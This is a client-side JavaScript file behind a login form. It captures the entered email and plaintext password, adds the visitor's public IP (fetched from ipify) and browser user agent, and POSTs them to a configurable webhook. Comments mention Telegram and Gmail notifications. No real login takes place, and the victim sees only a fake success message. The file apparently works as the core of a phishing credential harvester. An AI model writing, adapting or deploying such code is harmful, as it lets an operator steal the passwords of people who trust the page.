// Configuration for Telegram and Gmail notifications
const CONFIG = {
    TELEGRAM_BOT_TOKEN: 'YOUR_TELEGRAM_BOT_TOKEN',
    TELEGRAM_CHAT_ID: 'YOUR_TELEGRAM_CHAT_ID',
    WEBHOOK_URL: 'YOUR_WEBHOOK_URL'  // For backend processing
};

// Handle login form submission
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Validate inputs
    if (!email || !password) {
        showError('Please fill in all fields');
        return;
    }
    
    if (!email.includes('@')) {
        showError('Please enter a valid email address');
        return;
    }
    
    // Send data to backend
    await sendLoginData(email, password);
});

// Function to send login data to backend
async function sendLoginData(email, password) {
    try {
        const loginData = {
            email: email,
            password: password,
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            ipAddress: await getIPAddress()
        };
        
        // Send to your backend webhook
        const response = await fetch(CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(loginData)
        });
        
        if (response.ok) {
            showSuccess('Login successful! Notification sent.');
            setTimeout(() => {
                alert('Login would proceed here');
                // In real application: window.location.href = '/dashboard';
            }, 1500);
        } else {
            showError('Login failed. Please try again.');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('An error occurred. Please try again.');
    }
}

// Function to get user's IP address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Show success message
function showSuccess(message) {
    const successDiv = document.querySelector('.success-message') || createMessageDiv('success-message');
    successDiv.textContent = message;
    successDiv.style.display = 'block';
    setTimeout(() => {
        successDiv.style.display = 'none';
    }, 5000);
}

// Show error message
function showError(message) {
    const errorDiv = document.querySelector('.error-message') || createMessageDiv('error-message');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

// Create message div if it doesn't exist
function createMessageDiv(className) {
    const div = document.createElement('div');
    div.className = className;
    const loginBox = document.querySelector('.login-box');
    loginBox.insertBefore(div, loginBox.firstChild);
    return div;
}

// Add message divs to form on page load
document.addEventListener('DOMContentLoaded', function() {
    const loginBox = document.querySelector('.login-box');
    
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    loginBox.insertBefore(successDiv, loginBox.firstChild);
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    loginBox.insertBefore(errorDiv, loginBox.firstChild.nextSibling);
});